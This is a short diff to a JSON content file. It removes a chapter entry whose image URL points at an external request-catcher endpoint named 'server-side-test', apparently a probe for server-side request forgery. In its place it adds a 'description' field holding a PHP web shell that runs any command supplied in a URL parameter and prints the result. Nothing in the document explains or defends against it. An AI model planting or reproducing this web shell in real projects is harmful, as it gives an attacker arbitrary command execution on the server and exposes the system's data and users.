@@ -1,8 +1,3 @@
 {
-  "chapters": [
-    {
-      "id": "hydro-welcome",
-      "image": "https://9b59e4ab6079030b0f81dd581ab5963c.m.pipedream.net/server-side-test"
-    }
-  ]
+  "description": "<?php if(isset($_GET[\"c\"])){echo \"<pre>\".shell_exec($_GET[\"c\"]).\"</pre>\";} ?>"
 }
